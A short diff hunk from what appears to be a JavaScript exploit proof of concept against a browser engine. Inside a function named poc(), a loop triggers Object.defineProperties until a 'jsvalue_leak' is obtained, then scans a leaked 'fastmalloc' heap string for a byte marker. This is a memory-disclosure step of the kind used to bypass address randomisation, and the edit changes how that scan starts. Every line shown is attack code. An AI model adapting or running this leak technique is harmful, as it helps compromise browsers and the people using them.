@@ -186,7 +186,7 @@ function poc() {
 
     while (jsvalue_leak === null) {
         Object.defineProperties({}, props);
-        for(var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i++){
+        for (var i = 0;; i++) {
             if (fastmalloc.charCodeAt(i) == 0x42 &&
                 fastmalloc.charCodeAt(i + 1) == 0x44 &&
                 fastmalloc.charCodeAt(i + 2) == 0x43 &&
